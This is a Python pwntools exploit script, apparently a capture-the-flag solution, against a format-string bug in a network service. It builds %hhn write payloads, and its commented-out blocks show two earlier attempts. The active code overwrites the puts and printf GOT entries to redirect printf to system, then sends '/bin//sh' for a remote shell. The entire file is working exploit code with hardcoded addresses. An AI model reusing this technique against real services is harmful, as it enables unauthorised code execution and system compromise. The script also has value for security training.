from pwn import *

context.arch = 'amd64'

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10133)

magic_addr = 0x60106c
r.recvuntil(':')
r.interactive()

#printf %hhn ->  1byte -> 256
def fmt(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 256) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hhn' 
    return result

''' flag
pay = fmt(0,0xda,22)
pad = pay.ljust(0x80,'x') + p64(magic_addr)
r.send(pad)
'''

''' crax flag
target = 0xfaceb00c
pre = 0
pay = ''
for i in range(4):
    val = (target >> 8*i ) & 0xff
    pay += fmt(pre,val,22+i) 
    pre = val
pay = pay.ljust(0x80,'x') + p64(magic_addr) + p64(magic_addr+0x1) + p64(magic_addr+0x2) + p64(magic_addr+0x3)
'''

 
#change puts got to text before read main+0x81 0x400747
#also change the printf got to system
puts_got = 0x601018
printf_got = 0x601030
system_plt = 0x4005a0
main_0x81 =0x400747
pre = 0
pay = ''
#puts   -> main+0x81
for i in range(6):
    val = (main_0x81 >> 8*i ) & 0xff
    pay += fmt(pre,val,26+i) 
    pre = val
#printf -> system
for i in range(6):
    val = (system_plt >> 8*i ) & 0xff
    pay += fmt(pre,val,32+i) 
    pre = val
print hex(len(pay))
pay = pay.ljust(0xa0,'x')

#padd addr
for i in range(6):
    pay += p64(puts_got + i)
for i in range(6):
    pay += p64(printf_got + i)
    
print 'len' , hex(len(pay))
r.send(pay)

r.send('/bin//sh\0')
r.interactive()

